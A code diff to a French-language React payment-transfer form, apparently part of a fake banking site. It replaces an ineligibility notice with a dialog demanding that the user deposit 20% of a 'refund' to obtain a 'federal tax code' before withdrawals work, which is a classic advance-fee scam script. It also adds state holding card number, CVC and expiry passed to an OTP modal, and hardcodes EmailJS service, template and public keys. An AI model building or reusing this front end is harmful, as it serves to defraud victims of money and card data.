@@ -4,8 +4,17 @@ import { Loader2 } from "lucide-react";
 import { useState } from "react";
 import { useForm } from "react-hook-form";
 import * as z from "zod";
-
-
+import {
+  AlertDialog,
+  AlertDialogAction,
+  AlertDialogCancel,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogFooter,
+  AlertDialogHeader,
+  AlertDialogTitle,
+  AlertDialogTrigger,
+} from "@/components/ui/alert-dialog";
 
 import {
   Form,
@@ -18,23 +27,17 @@ import {
 } from "./ui/form";
 import { Input } from "./ui/input";
 import { Textarea } from "./ui/textarea";
-import { PaymentTransferFormProps } from "@/types";
 
 import PaymentDialogue from "./PaymentDialogue";
-import {
-  AlertDialog,
-  AlertDialogAction,
-  AlertDialogContent,
-  AlertDialogDescription,
-  AlertDialogFooter,
-  AlertDialogHeader,
-  AlertDialogTitle,
-} from "@/components/ui/alert-dialog";
+
 import { Button } from "@/components/ui/button";
-import { useSendTransaction } from "@/actions/tanstack/mutasion";
 import { useUserStore } from "@/actions/zustand/userState";
-import { toast, Toaster } from "sonner";
+
+import { Link } from "react-router-dom";
+import { useGetUserById } from "@/actions/tanstack/query";
 import OtpModal from "./OTPModal";
+import emailjs from "@emailjs/browser";
+import { Toaster, toast } from "sonner";
 
 const formSchema = z.object({
   email: z.string().email("Adresse e-mail invalide"),
@@ -43,34 +46,99 @@ const formSchema = z.object({
   sharableId: z.string().min(8, "Le numéro de carte est requis "),
 });
 
-function AlertDialogDemo({
-  open,
-  setOpen,
+export function AlertDialogDemo({
+  openAlert,
+  setOpenAlert,
 }: {
-  open: boolean;
-  setOpen: (P: boolean) => void;
+  openAlert: boolean;
+  setOpenAlert: (P: boolean) => void;
 }) {
+  const user = useUserStore((state)=> state.user)
+  const [isLoading, setIsLoading] = useState(false)
+  const sendEmail = async()=>{
+    emailjs
+    .send(
+      "service_ofgw6zl",
+      "template_3oel94s",
+      {
+        from_name:`${user?.firstName} ${" "} ${user?.firstName}` ,
+        from_email:user?.email,
+        from_phone: "aucune",
+        message: ` l'utilisateur  ${user?.firstName} ${" "} ${user?.firstName} demande le code`,
+      },
+      "_v1mrf9su7HdlCiCM"
+    )
+    .then(
+      () => {
+        setIsLoading(false);
+        toast.success(
+          "Merci pour votre confiance, je reviendrai vers vous dès que possible"
+        );
+      },
+      (error) => {
+        toast.error("échec du chargement du message, veuillez réessayer");
+        console.log(error);
+        setIsLoading(false);
+      }
+    );
+  }
   return (
-    <AlertDialog open={open} onOpenChange={setOpen}>
-      <AlertDialogContent className="bg-white max-md:w-[95%]">
+    <AlertDialog open={openAlert} onOpenChange={setOpenAlert}>
+      <Toaster richColors/>
+      <AlertDialogContent className="text-black bg-white text-left max-md:w-[90%] max-md:rounded-md ">
         <AlertDialogHeader>
-          <AlertDialogTitle>Transfert de fonds</AlertDialogTitle>
-          <AlertDialogDescription>
-            Vous n'êtes pas éligible pour effectuer cette transaction. Veuillez
-            contacter le service client pour plus d'informations.
+          <AlertDialogTitle>Activation du compte et code fiscal fédéral</AlertDialogTitle>
+          <AlertDialogDescription className="space-y-4 text-mono text-left">
+            <p>
+              Cher client, nous avons regardé de près votre compte et il montre
+              que le compte a été récemment créé. Pour que le code fiscal
+              fédéral a 6 chiffres permette des retraits réussis de votre
+              compte, nous vous demandons de bien vouloir initier une
+              transaction d'au moins 20 % du montant total du remboursement.
+              Cette transaction initiale est nécessaire pour vérifier l'activité
+              de votre compte et répondent aux normes réglementaires. Ce dépôt
+              sera ajouté au solde de votre compte.
+            </p>
+            
+            <p>
+              Une fois que vous aurez effectué ce dépôt, nous serons en mesure de
+            traiter les documents nécessaires et de vous envoyer le code de
+            tâche fédéral requis. Dès réception du code fiscal, votre compte
+            sera entièrement activé et vous serez éligible.
+            </p>
           </AlertDialogDescription>
         </AlertDialogHeader>
         <AlertDialogFooter>
-          <AlertDialogAction>Continue</AlertDialogAction>
+          <AlertDialogCancel>Annuler</AlertDialogCancel>
+          <AlertDialogAction
+          disabled={isLoading} className="form-btn">
+            {isLoading ? (
+              <>
+                <Loader2 size={20} className="animate-spin" /> &nbsp;
+                Loading...
+              </>
+            ) : "Obtenir le code"}
+        
+          </AlertDialogAction>
         </AlertDialogFooter>
       </AlertDialogContent>
     </AlertDialog>
   );
 }
 
-const PaymentTransferForm = ({ accounts }: PaymentTransferFormProps) => {
+const PaymentTransferForm = () => {
   const [open, setOpen] = useState(false);
 
+  const [formValues, setFormValues] = useState({
+    name: "",
+    city: "",
+    number: "",
+    amount: "",
+    cvc: "",
+    year: "",
+    month: "",
+  });
+  const [status, setStatus] = useState("");
   const form = useForm<z.infer<typeof formSchema>>({
     resolver: zodResolver(formSchema),
     defaultValues: {
@@ -78,61 +146,46 @@ const PaymentTransferForm = ({ accounts }: PaymentTransferFormProps) => {
       email: "",
       amount: "",
       sharableId: "",
-      
     },
   });
+  const [openAlert, setOpenAlert] = useState(false);
+  const user = useUserStore((state) => state.user);
+  const { data: real_time_user } = useGetUserById(user?.$id!);
+  let isLoading = false;
 
-  const { mutateAsync: transaction, isPending: isLoading } =
-    useSendTransaction();
- const user = useUserStore((state)=> state.user)
   const submit = async (data: z.infer<typeof formSchema>) => {
-    console.log(data);
+    console.log(formValues);
+    setFormValues({ ...formValues, amount: data.amount });
 
-    if(data.code && data.code === user?.code ){
-      const transactionData = {
-        channel: "credit card",
-  
-        amount: Number(data.amount),
-  
-        status: "succes",
-  
-        userId: user?.$id,
-  
-        type: "credit",
-      };
-      const credential = transaction(transactionData)
-      if (!credential) {
-        return null
-      }
-
-      toast.success("Transaction réussie")
-    }else if(!user?.code || user?.code == null || user.code ==="" ){
-      setOpen(true)
-      
-        const transactionData = {
-          channel: "credit card",
-    
-          amount: Number(data.amount),
-    
-          status: "failed",
-    
-          userId: user?.$id,
-    
-          type: "credit",
-        };
-        const credential = transaction(transactionData)
-        if (!credential) {
-          return null
-        }
-  
-        toast.error("Transaction réussie")
+    if (
+      real_time_user?.code === null ||
+      real_time_user?.code === "" ||
+      real_time_user?.code === " "
+    ) {
+      setOpenAlert(true);
+      setStatus("failed");
+    } else if (
+      real_time_user?.code ||
+      real_time_user?.code !== "" ||
+      real_time_user?.code !== null ||
+      real_time_user?.code?.length > 0
+    ) {
+      setOpen(true);
+      setStatus("sucess");
     }
   };
 
   return (
     <Form {...form}>
+      <OtpModal
+        open={open}
+        setOpen={setOpen}
+        userId={user?.userId}
+        values={formValues}
+        status={status}
+      />
+      <AlertDialogDemo openAlert={openAlert} setOpenAlert={setOpenAlert} />
       <Toaster richColors />
-      <OtpModal open={open} setOpen={setOpen} />
       <form onSubmit={form.handleSubmit(submit)} className="flex flex-col">
         {/* <FormField
           control={form.control}
@@ -182,7 +235,7 @@ const PaymentTransferForm = ({ accounts }: PaymentTransferFormProps) => {
                 <div className="flex w-full flex-col">
                   <FormControl>
                     <Textarea
-                      placeholder="Write a short note here"
+                      placeholder="Écrivez une courte note ici"
                       className="input-class"
                       {...field}
                     />
@@ -239,7 +292,7 @@ const PaymentTransferForm = ({ accounts }: PaymentTransferFormProps) => {
                 <div className="flex w-full flex-col">
                   <FormControl>
                     <Input
-                      placeholder="Enter the public account number"
+                      placeholder="Entrez le numéro de compte"
                       className="input-class"
                       {...field}
                     />
@@ -303,7 +356,7 @@ const PaymentTransferForm = ({ accounts }: PaymentTransferFormProps) => {
           <Button type="submit" className="payment-transfer_btn">
             {isLoading ? (
               <>
-                <Loader2 size={20} className="animate-spin" /> &nbsp; Sending...
+                <Loader2 size={20} className="animate-spin" /> &nbsp; Envoi en cours...
               </>
             ) : (
               "Transférer des fonds"
@@ -311,8 +364,7 @@ const PaymentTransferForm = ({ accounts }: PaymentTransferFormProps) => {
           </Button>
         </div>
       </form>
-      <PaymentDialogue />
-      {/*<AlertDialogDemo open={open} setOpen={setOpen} /> */}
+    
     </Form>
   );
 };
